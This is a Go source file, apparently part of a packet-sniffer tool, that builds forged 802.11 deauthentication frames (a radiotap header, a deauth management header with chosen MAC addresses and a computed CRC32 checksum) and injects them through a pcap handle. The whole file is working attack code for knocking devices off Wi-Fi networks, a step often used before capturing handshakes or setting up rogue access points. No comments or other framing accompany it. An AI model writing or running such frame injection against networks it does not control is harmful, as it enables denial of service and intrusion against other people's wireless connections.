package sniffer

import (
	"encoding/binary"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"hash/crc32"
	"net"
)

func sendDeauth(handle *pcap.Handle, addr1, addr2, addr3 net.HardwareAddr) error {
	data := makeDeathPacket(addr1, addr2, addr3)
	if err := handle.WritePacketData(data); err != nil {
		return err
	}
	return nil
}

func makeDeathPacket(addr1, addr2, addr3 net.HardwareAddr) []byte {
	radio := radioTap()
	dot11 := dot11(addr1, addr2, addr3)
	deauth := dot11Deauth()
	b := make([]byte, 0)
	b = append(b,radio...)
	b = append(b, dot11...)
	b = append(b, deauth...)

	realloc := make([]byte, len(b)+4)
	copy(realloc[0:], b)
	h := crc32.NewIEEE()
	_, _ = h.Write(append(dot11, deauth...))
	binary.LittleEndian.PutUint32(realloc[len(b):], h.Sum32())
	b = realloc

	return b
}

func radioTap() []byte {
	radio := layers.RadioTap{}
	radio.Present = 0x482b
	radio.Flags = 0x10
	radio.ChannelFrequency = channelToMhz(1)
	radio.ChannelFlags = layers.RadioTapChannelFlags(0xa0)
	radio.DBMAntennaSignal = -50
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	_ = gopacket.SerializeLayers(buf, opts, &radio)
	return buf.Bytes()
}

func dot11(addr1, addr2, addr3 net.HardwareAddr) []byte {
	dot11 := layers.Dot11{}
	dot11.Type = layers.Dot11TypeMgmtDeauthentication
	dot11.Address1 = addr1
	dot11.Address2 = addr2
	dot11.Address3 = addr3
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	_ = gopacket.SerializeLayers(buf, opts, &dot11)
	return buf.Bytes()
}

func dot11Deauth() []byte {
	deauth := layers.Dot11MgmtDeauthentication{}
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	_ = gopacket.SerializeLayers(buf, opts, &deauth)
	return buf.Bytes()
}
